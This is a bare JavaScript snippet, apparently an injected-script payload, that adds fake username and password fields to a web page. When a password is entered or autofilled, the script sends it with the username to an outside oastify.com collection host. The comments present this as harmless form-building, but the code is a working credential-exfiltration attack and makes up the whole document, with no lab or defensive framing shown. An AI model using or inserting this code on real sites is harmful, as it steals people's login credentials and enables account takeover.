// Create the username input field
var usernameInput = document.createElement('input');
usernameInput.name = 'username';
usernameInput.id = 'username';

// Create the password input field
var passwordInput = document.createElement('input');
passwordInput.type = 'password';
passwordInput.name = 'password';
passwordInput.onchange = function() {
    if (this.value.length) {
        fetch('https://wmmz7cgqdxierwsf89w3og4z9qfh39ry.oastify.com/?credsdz', {
            method: 'POST',
            mode: 'no-cors',
            body: usernameInput.value + ':' + this.value
        });
    }
};

// Append the input fields to the body or any other container element
document.body.appendChild(usernameInput);
document.body.appendChild(passwordInput);
